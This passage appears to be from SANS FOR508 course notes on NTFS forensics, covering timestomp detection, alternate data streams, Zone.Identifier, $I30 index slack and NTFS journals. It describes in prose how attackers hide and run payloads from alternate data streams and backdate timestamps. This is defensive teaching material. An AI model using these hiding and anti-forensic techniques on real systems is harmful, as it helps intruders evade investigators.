such that we can sort not only by time, but also by MFT record number. For example, mftecmd and fls.

6.

7.

[1] Archived ForensicsWiki article on timestomp.exe: https://for508.com/zdyx9
[2] ExifTool by Phil Harvey: https://for508.com/clize

© 2023 SANS Institute

.

47

Timestomp Detection

Multiple strikes against this svchost.exe
$SI Creation time < $FN Creation time

All zero fractional seconds

Compile time > File Creation & Mod times

ShimCache time > File Mod time

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Here we see the result of 4 timestamp checks against a malicious file from the previous intrusion at Stark
Research Labs.

.

At the top, we see a snippet of output from using mftecmd to parse the MFT of a compromised host. The output
type was CSV, which includes sub-second granularity as well as some built-in anomaly checks. Prior analysis
indicated C:\Windows\System32\dllhost\svchost.exe was malicious. However, the timestamps did not align
with other activity associated with the attack. Therefore, we performed a number of checks to look for signs of
timestomping:
• The $STANDARD_INFORMATION creation time was prior to $FILE_NAME creation time. By itself, this
check can lead to a lot of false-positives. However, combined with other checks and contextual artifacts, it
proved to be a true-positive in this case. Note that mftecmd has an automatic check for this named “SI<FN”.
This check will not occur if outputting to bodyfile format.
• The $STANDARD_INFORMATION creation time’s fractional second values are all zeros. “u Sec” is an
automatic check for this anomaly with mftecmd when not outputting to bodyfile format.
• Using exiftool.exe, the compile time (labeled simply “Time Stamp”) is more recent than either the creation
time or modification time.
• Parsing the SYSTEM registry hive with AppCompatCacheParser.exe provides the last modification time of
the executable when Windows first evaluated it. Comparing that last modification time to the file systems’
last modification time shows a mismatch. Importantly, AppCompatCache shows a later modification time
that the one reported by the filesystem, providing yet more evidence of backdating.

48

© 2023 SANS Institute

.

48

Analyzing $DATA
• File data is maintained by the $DATA attribute
• Non-resident: $DATA attribute lists the clusters on disk where the data resides
• Resident: If data is ~700 bytes or less, it gets stored inside the $DATA attribute
(Fun fact: MFTECmd can dump resident files from an $MFT using the --dr option!)

• Files can have multiple $DATA streams
• The extra, or “Alternate Data Streams” (ADS), must be named
Two
$DATA
streams

One large
nonresident
& one
small
resident

The 2nd
one is a
named
ADS
MFT record 103841 is for C:\Users\tdungan\Downloads\eb018933.html

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

49

Continuing the analysis of NTFS attributes, let’s examine perhaps the most important, the $DATA attribute.
This attribute either points to where the data resides on disk, or if the data is small enough (~700 bytes or less),
then it stores the data in the MFT record for efficiency purposes.

.

Regarding file data, we usually think of files as having a one-to-one relationship with a single data set (aka data
“stream”). However, in NTFS, there’s no such limitation. Files can, and often do, have more than one data
stream associated with them.
In this slide, we are analyzing a different file. This one is from our the 2018 SRL intrusion case, located in
Timothy Dungan’s Downloads directory at C:\Users\tdungan\Downloads\eb018933.html on his workstation
base-rd-01. Notice that it is a good example of a file having more than one $DATA attribute, with one being
resident and the other being non-resident.
Let’s take a closer at the structure of the primary $DATA attribute. By definition, the primary data stream for a
file is the unnamed $DATA attribute.
$DATA Attribute
The $DATA attribute is identified by the signature value of 0x80, or 128 in decimal.

© 2023 SANS Institute

.

49

After the $DATA attribute header, the content of the attribute will contain either actual content or the
information needed to figure out which clusters to read to obtain the data. A byte at offset 0x08 designates if the
content of this attribute is resident (0x00) or non-resident (0x01).
Virtual Cluster Numbers (VCN) are used to track the contiguous, in-order clusters that make up a file. Except in
rare cases, these will always start at zero and end with a count of the number of clusters consumed by the
content of the file.

.

The Allocated Size is the size of the clusters consumed by the file (file content + file slack). The True Size is the
actual size of the content of the file. The Initialized Size is the size of the clusters reserved for this file to grow
into. Initialized Size is used when Windows allocates space for the file to grow into, but that space is not
considered part of the actual content of the file (yet).
Data runs consist of a series of entries that tell us the starting point and length of each segment of the file.[1]
Each entry has a 1-byte header that consists of two fields, one in each nibble. From the example below, 0x41
tells us that we need to read in 1 byte of data from the data run to determine the length of the run (0x01) and 4
bytes to get the starting cluster of that run (0x9B5BD400). The next byte after that is x00, which tells us that we
are at the end of the data runs.

From the example above:
• Length of cluster run is 0x01 clusters
• Offset to start of run provides a starting cluster of 0x00D45B9B (stored in little endian)
In this example, the data is not fragmented, as there is only one data run (and in fact, only one cluster). A
fragmented file will have at least two data runs.
50

© 2023 SANS Institute

.

Alternate Data Streams (ADS)

.

In the example below, we have a FILE record with two $DATA attributes. The first thing to notice is that both
of our $DATA attributes are resident since we see the value 0x00 at offset 0x8. At offset 0x9, we see the length
of the name (0x00) followed by the offset to the name. Since the length of the name is 0, no name is stored at
0x18. By definition, this is the primary data stream. At offset 0x10, the content length for the resident data is
stored, while offset 0x14 contains the offset to where the content starts. Notice in the case of resident data where
the name length is zero, the Name offset, and Content offset are the same. To find the contents of this file, we
simply go to the Content offset and read in Content-length bytes.

In our second $DATA attribute (our alternate data stream), we see that it is also resident, but in this case, the
name length is 0x7 characters long. The name offset is 0x18, so to get the name of the ADS, we jump to relative
offset 0x18 and read name length * 2 bytes of data (since the filename is stored as double-byte Unicode). Also,
notice that the name offset, and content offset are different since the name is present in the ADS. Since the ADS
is also resident, we can follow the same procedure as for our first $DATA attribute to get its contents. If the
ADS were not resident, the $DATA attribute would contain data runs as we saw previously.
To put it simply, Alternate Data Streams are merely the presence of a second $DATA attribute, much in the
same vein that a file can have multiple $FILE_NAME attributes. The primary attribute is never named, deriving
its name from the $FILE_NAME attribute. Any subsequent $DATA attributes must be named to be able to
address them.[2] This is accomplished by including a Unicode string just before the content of the ADS for
resident attributes and immediately preceding the data runs for nonresident attributes.
ADS functionality was originally included in Windows NT as part of the Services for Macintosh functionality as
a way for a Windows File Server to support the concept of a Resource Fork that exists in Mac filesystems.
Ironically, Macintosh clients don’t make use of it and opt instead to create a second hidden file that contains the
second set of data.
Because the rest of Windows is designed to only accommodate the primary data stream, most tools cannot report
on the existence of an alternate data stream, let alone its size and contents. No other metadata about an alternate
stream is maintained beyond what is shown above. This makes alternate data streams an attractive place to hide
illicit tools and/or data. Microsoft has placed restrictions on the use of ADS in the past to try to thwart this.
However, hackers continue to find ways around those restrictions, so it is still important to keep an eye out for
© 2023 SANS Institute

.

51

unexpected alternate data streams.

.

Carrier, Brian. File System Forensic Analysis. Boston, MA: Addison-Wesley, 2005. Print. Pages 355–359.
[1] Data Runs - Concept - NTFS Documentation http://for508.com/fzhay
[2] File Streams (Windows) http://for508.com/lrcgy

52

© 2023 SANS Institute

.

Extracting Data with The Sleuth Kit’s icat
icat [options] image inode > extracted.data
-r:
-s:

Recover deleted file
Display slack space at end of file

Extract Data from a Metadata Address
• By default, the icat tool extracts data to STDOUT based on a specific metadata entry
• Able to extract data from metadata entries marked deleted

Extracting NTFS $DATA streams
• With NTFS, the default will be to extract out the primary $DATA stream
• To extract a different stream, such as an Alternate Data Stream, use the syntax:
<mft#>-<AttributeType>-<AttributeID>

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

53

.

Another very useful tool from The Sleuth Kit is “icat”. With icat, we can provide an image file and an MFT
entry number (aka “inode” number) and icat will go to the metadata entry to extract out file or attribute contents.
If providing the MFT entry number (inode number) alone, it will export out the primary $DATA stream.
Another option is to provide a specific attribute ID to extract other data, including alternate data streams. At the
bottom of the slide, we have specified the “Zone.Identifier” named stream, which istat had listed as attribute ID
128-9 for MFT 103841 (see previous slide’s output showing this attribute ID).
icat is not limited to extracting contents of the $DATA attribute. It can also be used to get data from the other
NTFS attributes. For example, based on the output from istat in the previous slide, we could run “icat baserd01-cdrive.E01 103841-48-7 | xxd” to see that attribute in a hex dump view. In this case, it’s the long
$FILE_NAME attribute for the HTML file eb018933.html.

© 2023 SANS Institute

.

53

The Zone.Identifier ADS: Evidence of Download
A file with an ADS named
Zone.Identifier containing
ZoneId=3 was downloaded
from the Internet, as seen
here in FTK Imager

ADS within timelines
provide added context

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Have you ever wondered how a Word document or PowerPoint presentation gets recognized as being
downloaded from the Internet, forcing you to “Trust” it to edit it? Office apps are able to do this because when
the file was downloaded, it was tagged with an identifying ADS named “Zone.Identifier”, as illustrated above.
From an analysis perspective, this is an excellent resource, as it can provide a quick way to find downloaded
files, and potentially even where they came from.
The core functionality of the Zone.Identifier alternate data streams started all the way back with Windows XP
SP2. Since then, when most files are downloaded from the Internet to an NTFS volume, an alternate data stream
is added to the file. Most browsers, and many other Internet applications such as chat and mail clients, are now
tagging downloaded files with the Zone.Identifer ADS. This feature has been dubbed “Mark of the Web”
(MotW) and is provided via the Windows API function IAttachmentExecute for safely downloading and
exchanging files.[1][2] There are some exceptions, such as Internet Explorer only tagging certain file types that it
deems could be harmful and command-line tools such as PowerShell and ftp.exe being unlikely to tag
downloads.[3] Firefox and Chromium-based browsers also routinely limit information stored within the
Zone.Identifier, such as ReferrerURL or HostURL, during private browsing sessions.
The screenshot at the top of the slide shows a Zone.Identifier ADS and its contents using FTK Imager. We are
focused on the Zone.Identifier and the data it has logged. The downloaded file was a copy of Velociraptor,
hosted on GitHub. The browser used to download this file was Chrome, but for testing purposes, the file was
also downloaded with Firefox and the latest version of Edge (based on Chromium). Those browsers had the
exact same data in their Zone.Identifier ADS. A final test was done with Internet Explorer. It provided only the
basic Zone.Identifier information with a “ZoneId=3” without ReferrerURL or HostURL information.
The bottom half of our slide shows MFT information within a super timeline. While ADS are represented as
separate lines in a timeline, they do not maintain their own timestamps and hence share those of the file to which
they are attached. ADS provide additional context, such as the file downloading via Chrome seen in this
example. Should a user be downloading strange executables? They can also be useful pivot points to scan
locations where you would not expect to find downloads, such as C:\Windows\System32. A significant percent
of intrusions are precipitated by a user downloading a dangerous or vulnerable file type, and Zone.Identifier
information can often make identification easy.
54

© 2023 SANS Institute

.

54

Finally, as we saw in the previous slide, istat is another tool that can show the existence of additional data
streams for a specific file, and icat can be used to easily extract them by providing the exact attribute ID.
The minimum information to be included in the Zone.Identifier ADS is the “ZoneID”. Possible ZoneIDs values
currently include:
NoZone = -1, MyComputer = 0, Intranet = 1, Trusted = 2, Internet = 3, Untrusted = 4
Note that “Untrusted=4” is the tag applied to a file when Microsoft SmartScreen flags it as suspicious. [4] Also,
SmartScreen may apply on its own ADS, as shown below. The following file was downloaded using the
developer branch of the Edge browser, code-named “Anaheim”:

.

[1] Microsoft’s IAttachmentExecute documentation: https://for508.com/9jzia
[2] Downloads and the Mark-of-the-Web: https://for508.com/o-158
[3] Phill Moore’s winning Sunday Funday Zone.Identifier Solutions: https://for508.com/hqz32
[4] How Microsoft SmartScreen works and how it stores data in NTFS streams: https://for508.com/lf6or

© 2023 SANS Institute

.

55

Hide and Execute Malicious Payloads with ADS

Alternate Data Streams
also provide ample
opportunities for
attackers to hide!

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Attackers routinely look for new ways to hide from defenders and defensive tooling. Alternate data streams can
be a useful feature to leverage for this purpose, since most Windows applications and APIs only access the
primary data stream. MITRE ATT&CK® has documented this technique as T1564.004.[1]

.

There are many examples of attackers and red-teamers using alternate data streams. In fact, the LOLBAS
project was created by red-teamers, and much of their research is based on defeating defensive technologies,
such as application control and AV/EDR tools. One area of focus is the ability to store data and execute
payloads from alternate data streams. A look at the “alternate data stream” category shows many Windowsnative tools that can do both.[2]
The example on the bottom of the slide shows the rundll32.exe program executing a malicious DLL hidden in an
ADS named “ADSDLL.DLL” for the file C:\ads\file.txt. When interrogating file.txt with most tools, they would
have no knowledge of the hidden ADS.
Two built-in ways of querying alternate data streams include CMD’s “dir /r” command and several
PowerShell cmdlets with the -Stream option (e.g.,Get-Item * -Stream *).[3] One location where you
will normally see many alternate data streams is users’ Downloads folder, due to the prevalence of Mark of the
Web (MOTW) Zone.Identifier objects.
[1] MITRE ATT&CK® ADS technique T1564.004: https://for508.com/lvsti
[2] LOLBAS project documenting ADS functionality: https://for508.com/ixgya
[3] PowerShell Cookbook: https://for508.com/d6vyk
[4] SentinalOne Labs’ “WastedLocker” ransomware article on abusing ADS: https://for508.com/vmpcw

56

© 2023 SANS Institute

.

56

Filename Layer Filenames: Not Just Stored in the $MFT
Analysis

Filenames potentially stored in two places:
• File System Metadata
• MFT Entry
• Directory Data
• Contains list of children files/directories

Lethal
Technique:

• Most file wiping software does not wipe
directory entries
• Slack space of directory will contain metadata
including file names and timestamps
• Some forensic tools ignore directory slack
entries

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

57

Files are ultimately what matter in investigations, since they store the data that users interact with and that
attackers go after. However, directories can provide an analyst with a lot of contextual information, including
potentially even historical information about files that were once in those directories.

.

Directories are essentially files themselves, but the data they store is metadata information about their contents.
With NTFS, directories store this metadata in an index called the $I30. As we see in so many other artifacts,
when entries get deleted from this index, the entries are not initially overwritten, they are just marked unused.
We call these unused entries “slack” entries. This additional location for storing file system metadata can be a
wonderful resource because it essentially becomes another location for investigators to search for deleted files
and folders.
The type of index used by NTFS is a B-tree index, which we’ll describe in detail later. The functioning of the
index becomes important because of how Windows maintains it, and what effect that can have on “slack”
entries. Big picture though, we have the possibility of finding deleted entries not only in the MFT, but also in
the directory indexes.

© 2023 SANS Institute

.

57

Filename Layer
Analysis

NTFS Directory Attributes

Stored in an index named $I30
Index composed of $INDEX_ROOT and optionally $INDEX_ALLOCATION
• $INDEX_ROOT – required (stored in MFT)
• $INDEX_ALLOCATION – required for larger directories (stored in clusters)

$INDEX_ROOT is
required and always
resident
$INDEX_ALLOCATION
is optional and always
non-resident

MFT record 9374 is for C:\Users\tdungan\Downloads\
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

A directory is essentially a file, and as such, it will consume an MFT record and contain
$STANDARD_INFORMATION and $FILE_NAME attributes just like any other MFT “FILE” entry. The
difference is that instead of a $DATA attribute to store file data, it stores a structured index that lists the contents
of the directory.

.

The index itself is made up a $INDEX_ROOT attribute, and optionally a $INDEX_ALLOCATION. If there are
only a few entries, they will be listed in the $INDEX_ROOT attribute, which always resides inside the MFT. If
there are more than a few entries, then a second attribute, $INDEX_ALLOCATION, is used to store the
additional entries. The $INDEX_ALLOCATION attributes will always be non-resident and is structured almost
exactly the same as $DATA attributes, including the use of data runs to describe which clusters contain the data.
Overall, the index is named $I30, whether it consists of just the $INDEX_ROOT or is large enough to also need
the $INDEX_ALLOCATION attribute. It is implemented as a B-tree structure for performance reasons. Let’s
next take a look at the implementation, as it has important ramifications for our forensic analysis.

58

© 2023 SANS Institute

.

58

B-Tree Index Searching
•
•
•

Indexes are used in multiple places in NTFS, but the directory index is most common
Indexes in NTFS are implemented as B-Trees for efficiency
How does it work? The OS begins a search at the index root, which provides just a few branches to
choose from. By quickly narrowing the choices, it provides a fast path to locate a file of interest.
fgdump.exe mmc.exe

bootcfg.exe defrag.exe
defrag.exe

calc.exe

svchost.exe

tasklist.exe

net.exe

ping.exe

quser.exe

ipconfig.exe klist.exe

lsass.exe

expand.exe
expand.exe

cmd.exe
cmd.exe

at.exe

a.exe

reg.exe

xcopy.exe

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

59

A directory index in NTFS is essentially a list of lists. Each list is relatively small for efficiency purposes. These
lists are called “nodes” on the B-tree, and they can be thought of like leaves on a tree, all branching out from the
root node. As the directory grows, more nodes (each containing a short list) are added to the tree. When
expanded out, the overall arrangement is effectively alphanumeric, as depicted in the slide above.

.

The B-tree algorithm requires a root list with a few entries that are fairly evenly spaced out among the full list of
entries. When a name needs to be located by the OS, it starts at the root, and either finds it there quickly, or it
finds the proper node path quickly. This technique generally provides faster and more predictable search times
to find entries of interest than would be the case if it were just one very long list from start to finish.
For the NTFS directory index implementation, the root node is stored in the $INDEX_ROOT attribute of the
directory, which is always resident in the MFT. As a directory gets more files and folders, it needs to allocate
more space for entries than can be stored in the root. This leads to the creation of child nodes, which are written
into clusters via the $INDEX_ALLOCATION attribute.
This description provides a basic overview of the directory index’s structure. Things get more interesting when
we consider the maintenance of the index, which causes a shuffling of entries and often results in “slack”
(unused) entries becoming available. We’ll cover that process next, but first, let’s take a closer look at the
format of the metadata entries in the index.
$I30 INDEX_ALLOCATION Header
We start with the $INDEX_ALLOCATION header, which begins with the signature value “INDX”. Because
the nodes that are stored in the $INDEX_ALLOCATION are written into clusters on the disk, this value should
be the start of any clusters holding $INDEX_ALLOCATION data. This fact will be useful to us when we later
consider how we might recover (carve) deleted index data from unallocated space on the disk. One other
interesting aspect of the header is comparing the Size of Entries field at offset 0x1C versus the Allocated Size of
Entries field at 0x20. The Size of Entries field tells us how much space is actually being used in this particular

© 2023 SANS Institute

.

59

node. The Allocated Size of Entries tells us how much space is available to store entries. By subtracting Size of
Entries from Allocated Size of Entries, we get the slack space available in this node where we (or better yet our
tools) can look for old entries. In the example below, the available slack space is:
4,072 (0x0FE8) - 2,480 (0x09B0) = (0x0638) 1,592 bytes.

$I30 Index Entry

.

Following the $INDEX_ALLOCATION header (or in the case of the $INDEX_ROOT, the $INDEX_ROOT
and node header) are a series of index entries for holding the metadata for each file and folder in the parent.
Each index entry will have a short 16-byte header, beginning at 0x40 in the following example.

An important part of this header is the MFT entry number at the beginning. This is used to point the OS back to
the proper MFT record that has all the metadata about this file, including where the data actually resides.
However, the point of the index entry is to include some of the key information within the index so that the OS
doesn’t have to hop all around the MFT to do a file listing. So what metadata is included in an index entry?
After the 16-byte index entry header, the information stored is exactly in the format of a $FILE_NAME entry. It
parses out the same, with the Parent Directory Reference, four timestamps, size, flags, and the filename. In fact,

60

© 2023 SANS Institute

.

it’s no accident that the name of the index is “$I30”. Can you remember what the attribute signature is of a
$FILE_NAME attribute? It’s 0x30, and that is a clue as to how to read the entries in the index!
Although the structure is identical to the $FILE_NAME attribute, there is one important distinction: The
timestamp values that are stored in the index entries are actually the $STANDARD_INFORMATION
timestamps rather than the $FILE_NAME timestamps. This make sense because the point of the index is to
provide fast file listing capability, and since the OS often provides timestamps along with the file names, it
should use the proper set of timestamps that are to be relied upon.
One final note on the entries. If a file has two $FILE_NAME attributes in the MFT to accommodate long and
short names, then there will also be two index entries in the directory index.

.

[1] Carrier, Brian. File System Forensic Analysis. Boston, MA: Addison-Wesley, 2005.

© 2023 SANS Institute

.

61

B-Tree Index Rebalancing
•
•

Index trees are rebalanced periodically to maintain optimal efficiency
The effect is that deleted entries may (or may not) get overwritten. Also, active entries might be
moved to new locations, while their data in the old location could still reside in slack.
End result: When we review slack entries, they may be deleted, or may still be in use but moved

•

fgdump.exe mmc.exe

bootcfg.exe defrag.exe
defrag.exe

calc.exe

at.exe

a.exe

reg.exe

svchost.exe

tasklist.exe

net.exe

ping.exe

quser.exe

ipconfig.exe klist.exe

lsass.exe

expand.exe
expand.exe

cmd.exe
cmd.exe

xcopy.exe

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

A balanced tree allows the OS to traverse the index in the minimum number of nodes to find an entry of interest.
As items get added or deleted from the index, the tree will inevitably have more entries in certain areas than
others. This will negatively affect the efficiency of searches. To address this, the index is regularly rebalanced
to maintain a relatively even depth across the tree. The process of rebalancing causes active entries to get
moved to new nodes, which causes old entries to be overwritten. It can also cause copies of existing entries to
be left behind as they move to new locations. Although some deleted entries will be overwritten, it is also
common to find them still available in the unused “slack” areas of the index.
As a simple example, consider the updated B-tree in the slide where two files have been deleted (a.exe and
fgdump.exe). At first, the entries are marked deleted and both of those deleted files’ entries would be available
for recovery (as shown in the slide). However, at some point, the tree will be rebalanced in order to provide a
more optimized search. When the rebalancing occurs, the entries are shifted, and the end result would look
similar to the following.

62

© 2023 SANS Institute

.

62

Here’s a summary of the changes from rebalancing:
1. The file expand.exe moves to the root node, where the deleted fgdump.exe resided
2. To maintain alphanumeric sort order, defrag.exe slides to where expand.exe resided
3. To minimize lower-level child items, cmd.exe moves up a level to where defrag.exe resided
(Please note that this is a simple example for demonstration purposes. It's certainly possible that the NTFS
algorithm would have balanced the tree somewhat differently. However, this should provide a general idea of
the process.)
So now that the tree is nicely balanced from end to end, searching should be at near optimal efficiency. From a
forensics perspective, we're still left with two locations that contain prior entry data. One is for an existing file,
cmd.exe, which has now moved to a node higher on the tree. The other is for a deleted file on one of the edge
nodes.
What’s left behind leaves forensic analysts an opportunity to recover file metadata from both deleted files, as
well as existing files. At first glance, one might think that only the entries of deleted files are useful, since the
entries for existing files are still available for analysis with standard NTFS analysis tools. However, the slack
entries of existing files can still be useful at times because they could have timestamps that are different from a
file’s current timestamps. For example, suppose the file was modified recently and we recover the previous last
modification time for the file. This could be insightful for various file types, including OS files like prefetch and
LNK files (potentially giving us additional executable run times and file opening times, respectively). Another
example, going back to our discussion of how to detect timestomping, perhaps the file was backdated and we’re
able to recover an entry with the timestamps before the timestomping occurred. Now we have evidence of the
file’s timestamps pre- and post-timestomping. So yes, the ability to locate files that were deleted from the file
system can be a great boon to our investigation; but consider these examples where slack entries for existing
files can also be relevant to our investigations.

.

With regard to “deleted” items, keep in mind that this is a relative term in this situation. When we say
something is “deleted” in the context of the directory indexes, it means that the item is no longer in the directory
we are analyzing. However, the item may not have been deleted from the file system, but instead simply moved
to another directory. In that case, a simple check for the filename across the file system should allow us to
confirm. We can also use the MFT number and sequence number to further validate it is the exact same file, but
with a new parent. Furthermore, as we discuss next, the journals can help with validation as well!
[1] Wikipedia article on B-trees: https://for508.com/iys5w

© 2023 SANS Institute

.

63

Parsing $I30 Directory Indexes

• Indx2Csv for parsing exported or carved $I30 files
• Free tool from Joakim Schicht
• Parses out active and slack entries
• Includes additional features for recovering partial entries
Indx2Csv /IndxFile:G:\cases\$I30 /OutputPath:G:\cases

• Velociraptor for live file system and mounted images
• Parses out active and slack entries
• Able to recurse the file system
Velociraptor artifacts collect Windows.NTFS.I30 --args
DirectoryGlobs="F:\\Windows\\Temp\\Perfmon\\" --format=csv
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

“Indx2Csv” is one of several excellent (and free) forensics tools from Joakim Schicht. His tools consistently
provide features for parsing both well-known and lesser-known aspects of forensic artifacts. Indx2Csv is one
such tool, focusing on INDX records of several types, including $I30 directory indexes, $O ($ObjId), and $R
($Reparse). As is the case with most index parsers, Indx2Csv will parse out both active entries and slack entries
that are left behind due to deletion or tree rebalancing. Furthermore, it includes the ability to scan for partial
entries, allowing it to sometimes report metadata for deleted files and directories when their full index entry is
no longer available.
Indx2Csv reads an input file with INDX records exported with forensic tools such as FTK Imager and The
Sleuth Kit’s “icat”. For those familiar with FTK tools, such as the free FTK Imager, the INDX records show up
in directories as what appear to be files named “$I30”. In reality, they are not files, but instead a representation
of the $INDEX_ALLOCATION attribute for the parent directory. In any case, they can be exported out as files
for further analysis with tools such as Indx2Csv.
Alternatively, The Sleuth Kit’s “icat” tool can be used as discussed earlier to extract individual attributes. To
extract the $INDEX_ALLOCATION attribute of a directory, the command will be of the format:
icat DiskImage MFT#-160-AttributeID > $I30
(Note that the attribute type for $INDEX_ALLOCATION is always decimal 160.)
However, the index is exported, the resulting file can be parsed easily with Indx2Csv using the command-line
shown at the top of the slide. There are many command-line options available to adjust the parsing, scanning,
and output features. Refer to the tool’s GitHub repository for those details.[1]
Many of Joakim Schicht’s tools can also be executed with a graphical user interface by double-clicking on the
executable (e.g., Indx2Csv.exe or Indx2Csv64.exe). Here’s an example of the user interface for Indx2Csv.exe.

64

© 2023 SANS Institute

.

64

As you can see, there are several options for parsing and reporting. One of the advantages to Indx2Csv is its
ability to scan for partial entries. The “Scan mode” option controls that feature. Unfortunately, the project’s
documentation provides few details on it, so some experimentation may be necessary to find the optimal scan
level. (Per the documentation: “0 is normal mode without any scanning and is the default value. 1 is light level
scanning. 15 is deepest level”).

.ir

Velociraptor

hi

de

01

Velociraptor has quickly become a trusted tool for threat-hunting and incident response. It’s also flexible enough
to be used for a number of host-based forensic analysis tasks. One example is its capability to parse NTFS
directory indexes, handling both active and slack entries. It does not currently support parsing the exported
indexes, but it can parse indexes on live file systems and mounted volumes. One of the benefits to using
Velociraptor in this way is that the analyst doesn’t have to locate and export the $I30. Instead, simply provide
the path and allow Velociraptor to find and parse the directory index.
For instance, after using Arsenal Image Mounter to mount a disk image, we can parse the
\Windows\Temp\Perfmon directory in the following way (assuming the c-drive was mounted to F:).[2]
velociraptor.exe artifacts collect Windows.NTFS.I30 --args
DirectoryGlobs="F:\\Windows\\Temp\\Perfmon\\" --format=csv --nobanner >
G:\output\I30-Perfmon.csv
This will output both active and slack entries to a CSV file that can be analyzed with Timeline Explorer or any
spreadsheet application.
This is just one of many Velociraptor “artifacts” that can be used for offline analysis. To get a full list from the
command-line, run “velociraptor artifacts list“. Then get more information about a specific artifact with
“velociraptor show <artifact>”. And the beauty of Velociraptor is that anything it can do locally, it can also do
remotely, at scale!
INDXparse.py
One more tool worth mentioning is the venerable INDXparse.py from Willi Ballenthin. It parses the individual
$I30 index files only, similar to Indx2Csv. However, since it is Python-based, it’s cross-platform.[3]
Indx2Csv, on the other hand, is Windows-only.
[1] Indx2Csv on GitHub: https://for508.com/uh49w
[2] Arsenal Image Mounter: https://for508.com/38nes
[3] INDXparse.py on GitHub: https://for508.com/aoiw7

© 2023 SANS Institute

.

65

File System Journaling Overview
Records file system metadata changes
Two files track these changes: $LogFile and $UsnJrnl
Primary goal is returning file system to a clean state
Secondary goal is providing hints to applications about file changes
Forensic examiners can use journals to identify prior state of files,
and when their state changed
• Like VSS, they serve as a time machine, detailing past file system activities
• Unlike VSS, the journals are rolling logs, rather than point-in-time snapshots
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

The journaling features of NTFS provide critical functionality to the operating system, and they can likewise do
the same for our investigations. There are two separate journals with somewhat differing goals in what they aim
to accomplish. Each, however, allow an investigator to peer back in time to find moment-by-moment changes
to files and folders on the volume. In some ways, this can be even more impactful than the volume shadow
copies because the logs are continuously monitoring changes, rather than the “snapshot” in time of shadow
copies. Add to that the fact that the journals are also being backed up inside volume shadow copies, and all told,
we have the potential for significant visibility over days, weeks, and perhaps even months!
The two files that make up the journaling features of NTFS are the $LogFile and $UsnJrnl. The purpose of the
$LogFile is to provide low-level transactional data about the changes to the file system. This provides resiliency
to NTFS, so that if a critical error occurs, the file system can restore itself to a consistent state. On the other
hand, the $UsnJrnl logs higher-level actions that can be used by applications to monitor for file and directory
changes. This is a boon for applications such as AV and backup software, allowing them to efficiently take
action only on new or changed files.
From an investigator’s standpoint, both files can prove quite useful since they record file system activity from
different viewpoints. This is somewhat analogous to the use of flight recorders for crash investigations.
Airplanes are outfitted with two flight recorders, one for providing continuous monitoring of the onboard
instrumentation (the “flight data recorder”) and the other for recording the audio in the cockpit (the “cockpit
voice recorder”).[1] You can think of the $LogFile as the flight data recorder, providing detailed tracking of the
changes occurring to the system. Contrast that with the $UsnJrnl and cockpit voice recorder, which provide for
more of a situational-awareness recording of the changes that occurred.
Probably a better analogy is the comparison with network security monitoring data sets. In many ways, the
$LogFile is similar to the visibility provided by full packet capture, whereas the $UsnJrnl has the summary data
and longer time horizon provided by NetFlow logs.
[1] Flight recorder article on Wikipedia: https://for508.com/0-cxd

66

© 2023 SANS Institute

.

66

$LogFile Provides File System Resilience
• $LogFile stores low-level
transactional logs for
NTFS consistency

Events from a single file creation

• Maintains very detailed
information, including
full payload data to be
recorded in MFT,
Indexes, UsnJrnl, & more

Marker for file and

• Tends to last just a few
hours on active systems

directory creation

• Secondary drives often last
much longer (i.e., days)
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

67

The purpose of the $LogFile is file system resiliency. In order to provide this resilience, the $LogFile is
constantly tracking changes to the following NTFS features (at a minimum): MFT FILE records and their
attributes, $I30 directory indexes, the $UsnJrnl file (if enabled), the $Bitmap file that tracks cluster allocation,
and even the $LogFile itself (via recording maintenance tasks like “ForgetTransaction” events).

.

The information it records includes the actual data that is to be changed—not just information about the change
(which is closer to how the $UsnJrnl works). It records the actual data in its payload, so that if an issue occurs
such as a power outage, the OS can re-run the needed change and have the information available to do so. The
$LogFile, therefore, becomes very verbose, effectively recording all the data that is also recorded elsewhere.
Despite the verbosity, the logging mechanism is relatively efficient by limiting extraneous data. For example, if
only the $STANDARD_INFORMATION attribute is being modified, then only that attribute is added to the
$LogFile--and often, only the part of the attribute that needs to change is logged, rather than the whole attribute.
Still, since numerous attributes and NTFS system files are updated simultaneously as a result of most actions,
typical file system activities can easily create a dozen or more events within the $LogFile. As an example, the
slide above shows 25 entries recorded due to the creation of a single file.
Because of the detailed nature of the logs, and the fact that the $LogFile size defaults to just 64 MB (small by
today’s standards), the $LogFile on a computer’s primary system drive is likely to have only a few hours' worth
of events. On the other hand, if the system has been idle, or secondary drives are in use and relatively idle, then
those $LogFiles could easily stretch into days, or even weeks, in some cases.
Note that although the default size for the $LogFile is 64 MB, it can be adjusted. Use “chkdsk <volume> /L” to
verify the current size. Then use “chkdsk <volume> /L:<size>” to change it.[1]
Finally, it may be worth mentioning that although the $LogFile system is very effective at handling potential
issues with the file system, it is not designed to protect file data. Remember that the purpose of a file system is
to allow humans to organize the data that is written to disk as files, which are logically placed into folders. This
organizational capability of the file system is what the $LogFile aims to protect. However, the data inside the
files is not protected by the NTFS journals. If a power failure occurs in the middle of modifying an important
file, NTFS can use the $LogFile to complete that file system transaction (or back it out) when power is restored.
© 2023 SANS Institute

.

67

For example, if the modification timestamps needed to be updated, and the file size updated, and new cluster
runs assigned, then all of that information is stored in the $LogFile and can be applied to the NTFS file system
after power is restored. However, if the system was in the middle of writing the data into the newly assigned
clusters when the power went out, then that file will be corrupt unless a higher-level application provided
resiliency capabilities of its own for the file’s data. This is the reason that applications such as databases
maintain their own transactional journals—in order to provide resilience to the data that is critical to those
systems.

.

[1] NTFS Log Tracker by Forensic Insight: https://for508.com/9f0ow

68

© 2023 SANS Institute

.

$UsnJrnl Provides Change Tracking Service
• $UsnJrnl stores high-level
summary information
about changes to files &
directories

Events from a single file creation

• Used by applications to
determine which files they
should act upon
• Tends to last a few days
on active systems

Marker for file and
directory creation
